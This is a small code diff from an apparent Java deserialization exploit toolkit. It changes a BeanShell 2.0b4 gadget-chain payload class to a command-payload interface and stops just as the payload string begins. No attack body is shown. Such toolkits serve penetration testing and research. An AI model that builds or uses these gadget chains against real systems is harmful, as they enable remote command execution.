@@ -5,7 +5,7 @@ import com.h2tg.ysogate.utils.PayloadRunner;
 import bsh.BshClassManager;
 import bsh.Interpreter;
 import javassist.CtClass;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Reflections;
 
@@ -21,7 +21,8 @@ import static com.h2tg.ysogate.utils.CtClassUtils.insertField;
  * @author su18
  */
 @Dependencies({"org.beanshell:bsh:2.0b4"})
-public class BeanShell20b4 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
+public class BeanShell20b4 extends PayloadRunner implements CommandObjectPayload<PriorityQueue>
+{
 
 	public PriorityQueue getObject(String command) throws Exception {
 		String payload =
